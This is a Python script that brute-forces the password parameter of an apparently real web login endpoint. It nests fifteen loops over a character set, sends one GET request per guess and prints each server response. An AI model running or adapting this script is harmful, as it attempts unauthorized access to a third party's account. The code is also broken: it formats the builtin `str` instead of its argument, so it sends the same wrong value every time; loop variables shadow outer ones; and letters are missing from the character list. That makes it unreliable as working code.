import requests
import time

def get_url(string: str):
    return "https://www.fgnwct.com/auth?vkey=f40da19aac&ipAddr=1.2.3.4&authPwd={}".format(str)


chars = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4',
         '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'U', 'V', 'W', 'X', 'Y', 'Z',]

for i in range(1, 18+1):
    # url的有i个字符，每个字符都是在chars里
    u = ""
    p: int = 1
    pr: int = 0
    for a in chars:
        for b in chars:
            for c in chars:
                for d in chars:
                    for e in chars:
                        for f in chars:
                            for g in chars:
                                for i in chars:
                                    for j in chars:
                                        for k in chars:
                                            for l in chars:
                                                for n in chars:
                                                    for m in chars:
                                                        for o in chars:
                                                            for p in chars:
                                                                t = a+b+c+d+e+f+g+i+j+k+l+m+n+o+p
                                                                u = get_url(t)
                                                                req = requests.get(u)
                                                                print(req.text, t)
                                                                time.sleep(1)
